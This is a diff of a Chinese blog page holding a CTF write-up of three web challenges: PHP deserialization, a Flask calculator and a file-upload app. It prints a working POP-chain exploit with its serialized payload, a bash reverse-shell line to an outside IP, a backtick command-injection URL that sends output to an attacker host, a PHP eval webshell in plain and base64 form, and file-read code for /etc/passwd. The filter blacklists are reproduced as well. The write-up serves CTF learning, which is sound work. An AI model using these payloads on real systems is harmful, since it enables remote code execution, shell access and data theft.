@@ -411,6 +411,68 @@
             <div class="container">
     
     
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
 
     
     <article class="post-wrap">
@@ -452,172 +514,66 @@
         </header>
 
         <div class="post-content">
-            <p> #<a href="#a">1.ezpop</a><br> #<a href="#b">2.calc</a><br> #<a href="#c">3.upgdstore</a></p>
-<hr>
-<p>##<a id="a">ezpop</a><br>给出了源码：</p>
+            <h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><p>给出了源码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class crow</span><br><span class="line">&#123;</span><br><span class="line">    public $v1;</span><br><span class="line">    public $v2;</span><br><span class="line"></span><br><span class="line">    function eval() &#123;</span><br><span class="line">        echo new $this-&gt;v1($this-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class fin</span><br><span class="line">&#123;</span><br><span class="line">    public $f1;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;f1 . &#x27;114514&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function run()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($a, $b)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class what</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a-&gt;run();</span><br><span class="line">        return &#x27;hello&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class mix</span><br><span class="line">&#123;</span><br><span class="line">    public $m1;</span><br><span class="line"></span><br><span class="line">    public function run()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        eval(&#x27;#&#x27; . $this-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    unserialize($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
 <p>显然，这是要我们找到一条POP链。<br>我们从目的出发，找到可以利用的函数<code>eval()</code>——可以将字符串按照php代码来计算。如果传入<code>system()</code>函数调用外部命令实现rce，就有可能找到flag。<br>可以明确用<code>mix::get_flag()</code>函数触发<code>eval()</code>，那么，如何触发<code>mix::get_flag()</code>：<br>1、通过<code>mix::run（）</code>触发，但这样会限制$m1为”get_flag”，从而无法利用<code>eval()</code>执行命令，行不通；<br>2、通过<code>fin::__call($a, $b)</code>触发，将mix传入fin的<code>$f1</code>即可，可行。<br>接下来，如何触发<code>fin::__call($a, $b)</code>成了问题，目前就只形成了这样的链子<br><code>fin::__call() --&gt; mix::get_flag()</code><br>倒推困难，我们就找入口正推。这里注意到这样几个魔术方法</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__destruct()  //当对象被销毁时触发</span><br><span class="line">__toString()  //当把类当作字符串使用时触发</span><br><span class="line">__invoke()    //当对象调用为函数时触发</span><br><span class="line">__call()      //当对象上下文中调用不可访问的方法时触发</span><br></pre></td></tr></table></figure>
 
 <p>而<code>fin::_destruct()</code>恰好可以用来触发<code>what::_toString()</code>，从而可以触发<code>run()</code>，继而再触发一个函数，如果触发<code>_invoke()</code>，由于<code>world()</code>不可访问，就可以用之触发<code>_call()</code>，从而形成完整的POP链：</p>
-<figure class="highlight plaintext"><figcaption><span>--> what::__toString() --> fin::run() --> crow::__invoke() --> fin::__call() --> mix::get_flag()```（这里用的`fin::run()`，另一个似乎也可以）。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">另一个需要注意的点是：`eval()`用&#x27;#&#x27;进行了过滤，因此还需要绕过，这里可以选用`?&gt;`闭合，也可以选用`\n`换行符！</span><br><span class="line">构造exp如下：</span><br></pre></td></tr></table></figure>
-<?php
+<p><code>fin::__destruct() --&gt; what::__toString() --&gt; fin::run() --&gt; crow::__invoke() --&gt; fin::__call() --&gt; mix::get_flag()</code></p>
+<p>（这里用的<code>fin::run()</code>，另一个似乎也可以）。</p>
+<p>另一个需要注意的点是：<code>eval()</code>用’#’进行了过滤，因此还需要绕过，这里可以选用<code>?&gt;</code>闭合，也可以选用<code>\n</code>换行符！<br>构造exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class crow</span><br><span class="line">&#123;</span><br><span class="line">    public $v1;</span><br><span class="line">    public $v2;</span><br><span class="line"></span><br><span class="line">    function eval() &#123;</span><br><span class="line">        echo new $this-&gt;v1($this-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class fin</span><br><span class="line">&#123;</span><br><span class="line">    public $f1;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;f1 . &#x27;114514&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function run()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($a, $b)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class what</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a-&gt;run();</span><br><span class="line">        return &#x27;hello&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class mix</span><br><span class="line">&#123;</span><br><span class="line">    public $m1;</span><br><span class="line"></span><br><span class="line">    public function run()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        eval(&#x27;#&#x27; . $this-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//fin::__destruct() --&gt; what::__toString() --&gt; fin::run() --&gt; crow::__invoke() --&gt; fin::__call() --&gt; mix::get_flag()</span><br><span class="line"></span><br><span class="line">$a=new fin();//为了调用__destruct()方法</span><br><span class="line">$b=new fin();</span><br><span class="line">//$b=new mix;</span><br><span class="line">$c=new fin();</span><br><span class="line">$d=new crow();</span><br><span class="line">$e=new what();</span><br><span class="line">$f=new mix();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1=$e;//为了调用__toString()方法</span><br><span class="line">$e-&gt;a=$b;//为了去调用run方法</span><br><span class="line">$b-&gt;f1=$d;//为了去调用__invoke()方法</span><br><span class="line">$d-&gt;v1=$c;//为了去调用__call()方法</span><br><span class="line">$c-&gt;f1=$f;//为了去调用get_flag()方法 </span><br><span class="line">$f-&gt;m1=&quot;\nsystem(&#x27;ls /&#x27;);&quot; ;//用 \n 绕过注释符</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到<code>O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A16%3A%22%0Asystem%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D</code></p>
+<p>最后用bp传参即可（这里用<code>ls /</code>命令查根目录较麻烦，于是用<code>ls</code>查当前目录，也不很好找，最后选择用<code>cat *</code>查看所有文件，结果如下图）<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220822003739417-1945498056.png" width=500><br>成功找到flag！</p>
+<hr>
+<p>该题在构造pop链上思路不算混乱（可能跟我偷看了一眼wp有关），但是在传参上遇到了很大的问题，一方面HackBar（估计是HB自身问题）总是失败搞人心态，另一方面用burp suite发送POST请求的方法没有掌握，即有三个地方需要修改：<br>1、GET修改为POST方法<br>2、加上媒体类型信息：Content-Type: application&#x2F;x-www-form-urlencoded<br>3、末尾添加需上传语句：cmd&#x3D;xxxx</p>
+<hr>
+<p>另外有师傅在构造exp时传入<code>&quot;?&gt;&lt;? @eval(\$_POST[b]);&quot;</code>，继而利用蚁剑连接找flag，但是博主尚未弄清蚁剑🗡的这一功能，待研究后更新。<br>详情请访问这位师傅的Blog<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/124283836?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&utm_relevant_index=2">【2022DASCTF X SU】 三月春季挑战赛 web复现</a></p>
+<h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>题目上来就给个计算器，打开源码，发现是用python写的计算器。源码放在下面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line">import random</span><br><span class="line">from urllib import parse</span><br><span class="line">import os</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">def waf(s):</span><br><span class="line">    blacklist = [&#x27;import&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27; &#x27;,&#x27;_&#x27;,&#x27;|&#x27;,&#x27;;&#x27;,&#x27;&quot;&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;&amp;&#x27;,&#x27;getattr&#x27;,&#x27;os&#x27;,&#x27;system&#x27;,&#x27;class&#x27;,&#x27;subclasses&#x27;,&#x27;mro&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;eval&#x27;,&#x27;if&#x27;,&#x27;subprocess&#x27;,&#x27;file&#x27;,&#x27;open&#x27;,&#x27;popen&#x27;,&#x27;builtins&#x27;,&#x27;compile&#x27;,&#x27;execfile&#x27;,&#x27;from_pyfile&#x27;,&#x27;config&#x27;,&#x27;local&#x27;,&#x27;self&#x27;,&#x27;item&#x27;,&#x27;getitem&#x27;,&#x27;getattribute&#x27;,&#x27;func_globals&#x27;,&#x27;__init__&#x27;,&#x27;join&#x27;,&#x27;__dict__&#x27;]</span><br><span class="line">    flag = True</span><br><span class="line">    for no in blacklist:</span><br><span class="line">        if no.lower() in s.lower():</span><br><span class="line">            flag= False</span><br><span class="line">            print(no)</span><br><span class="line">            break</span><br><span class="line">    return flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    &quot;欢迎来到SUctf2022&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/calc&quot;,methods=[&#x27;GET&#x27;])</span><br><span class="line">def calc():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(&quot;num&quot;)</span><br><span class="line">    log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    if waf(num):</span><br><span class="line">        try:</span><br><span class="line">            data = eval(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return str(data)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;waf!!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000) </span><br></pre></td></tr></table></figure>
+<p>审查代码发现有<code>GET</code>传参，找到了口子。分析可知是用<code>GET</code>传参控制<code>num</code>变量，作为<code>log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</code>中的<code>&#123;2&#125;</code>。再看下去就能发现两个很敏感的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = eval(num) //</span><br><span class="line">os.system(log) //将字符串转化成命令在服务器上运行</span><br></pre></td></tr></table></figure>
 
-class crow
-{
-    public $v1;
-    public $v2;
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/W1995S/article/details/114759238">os.system()</a><br>由于<code>num</code>被<code>waf()</code>过滤得太多，我们只能把目标放在<code>os.system(log)</code>上，想办法对<code>log</code>下手，查找bash shell中可以做命令替换的函数：<code>$()、eval()与``反引号</code>，由于<code>$和eval</code>被过滤，这里只能选用反引号（优先执行`代码`）。[资料查阅：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hj605635529/article/details/73556855">反引号与$()的区别以及eval的作用</a>]<br>需要注意的是，程序会将num插入到log字符串的最后然后先后执行 eval（num）和os.system（log），因此不能让eval(num)报错而无法进行下一步，考虑python的特性，想到可以利用注释符<code>#</code>注释。<br>接下来，我们希望建立反弹shell，将其命令行的输入输出转到我们的攻击端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击端IP/攻击端监听端口 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/101.43.119.212/12306 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-    function eval() {
-        echo new $this->v1($this->v2);
-    }
+<p>[资料查阅：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_57497184/article/details/123404378">Linux下反弹shell的原理</a>]<br>但是<code>&amp;</code>也被ban了，没法直接用，但是也能得出一个思路：<strong>输出重定向到攻击机</strong>。</p>
+<p><code>payload：/calc?num=1%23`ls%09&gt;/dev/tcp/IP/2333` </code></p>
+<p>这里由于空格被过滤，<code>ls &gt;</code>写成<code>ls%09&gt;</code>，然后在攻击端监听2333端口<code>nc -lvp 2333</code><br>然后修改<code>ls</code>命令即可，这里博主服务器监听不到，仍然在找问题。</p>
+<hr>
+<h1 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h1><p>文件上传题，随便上传一个文件试试</p>
+<img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191351613-1945987939.png" width=200>
 
-    public function __invoke()
-    {
-        $this->v1->world();
-    }
-}
+<p>由此可以得知该题目只能上传php文件。直接试试<code>webshell.php</code>传一句话木马，结果不出意料的失败了，又试了几个木马的变形，发现都无济于事，像无头苍蝇一样乱撞。只传入<code>phpinfo()</code>看看有什么收获<br><img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191704191-1792350946.png" width=500><br>发现一大堆<code>disable_functions</code>，基本上所有的恶意函数全部都被过滤，接下来试试用<strong>拼接绕过</strong>的办法读取<code>/etc/passwd</code></p>
+<blockquote>
+<p>Linux 系统中的 &#x2F;etc&#x2F;passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。</p>
+</blockquote>
+<p>这里我们用最常用的<code>file_get_contents() 函数</code>来读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo (&quot;fil&quot;.&quot;e_get_c&quot;.&quot;ontents&quot;)(&quot;/etc/passwd&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-class fin
-{
-    public $f1;
+<img src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823211231635-994180552.png" width=500>
 
-    public function __destruct()
-    {
-        echo $this->f1 . '114514';
-    }
+<p>成功读取。<br>那么根据<strong>Web服务器的默认根文件夹</strong><code>/var/www/html</code>，可以尝试读取网站源码（这里尝试<code>index.php</code>），将文件代码改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo (&quot;fil&quot;.&quot;e_get_c&quot;.&quot;ontents&quot;)(&quot;/var/www/html/index.php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-    public function run()
-    {
-        ($this->f1)();
-    }
+<p>上传后打开，查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function fun($var): bool&#123;</span><br><span class="line">    $blacklist = [&quot;\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;`&quot;,&quot;chmod&quot;];</span><br><span class="line"></span><br><span class="line">    foreach($blacklist as $blackword)&#123;</span><br><span class="line">        if(strstr($var, $blackword)) return True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(0);</span><br><span class="line">//设置上传目录</span><br><span class="line">define(&quot;UPLOAD_PATH&quot;, &quot;./uploads&quot;);</span><br><span class="line">$msg = &quot;Upload Success!&quot;;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">$file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">$ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line">if(!preg_match(&quot;/php/i&quot;, strtolower($ext)))&#123;</span><br><span class="line">die(&quot;只要好看的php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content = file_get_contents($temp_file);</span><br><span class="line">if(fun($content))&#123;</span><br><span class="line">    die(&quot;诶，被我发现了吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$new_file_name = md5($file_name).&quot;.&quot;.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;Upload Failed!&#x27;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        echo &#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    public function __call($a, $b)
-    {
-        echo $this->f1->get_flag();
-    }
+<p>发现过滤掉了<code>$_、eval、assert</code>等字符串，也难怪最初尝试的后门上传失败。于是先上传了webshell的base64编码php文件——<code>a.php</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]); ?&gt;//不要忘记在php关键字后加空格！！！</span><br><span class="line">base64编码绕过——&gt;</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=</span><br></pre></td></tr></table></figure>
 
-}
+<p>但<code>反引号</code>被ban，也不知道如何把代码读取出来然后解码，也断绝了我用base64解码后再执行的想法。在其他大佬那里学到了<a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120695429"><strong>PHP伪协议</strong></a>，了解到<code>php://filter</code>+<code>convert.base64-decode过滤器</code>能解决问题。</p>
+<blockquote>
+<p>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行</p>
+</blockquote>
